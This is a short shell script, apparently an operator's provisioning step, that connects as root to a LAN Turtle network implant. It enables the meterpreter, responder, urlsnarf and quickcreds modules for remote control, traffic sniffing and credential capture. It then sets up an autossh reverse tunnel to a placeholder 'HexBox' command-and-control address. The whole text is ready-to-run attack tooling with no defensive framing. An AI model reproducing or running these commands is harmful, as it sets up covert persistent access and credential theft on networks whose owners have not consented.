# Run from HexBox C2 to provision a fresh Turtle
ssh root@172.16.84.1 << 'EOF'
turtle module enable autossh
turtle module enable meterpreter
turtle module enable responder
turtle module enable urlsnarf
turtle module enable quickcreds

# Configure autossh reverse tunnel back to HexBox
cat > /etc/turtle/modules/autossh.conf <<CONF
SERVER=<YOUR_HEXBOX_PUBLIC_IP>
PORT=2222
REMOTE_PORT=2223
USER=tunnel
CONF

turtle module start autossh
EOF
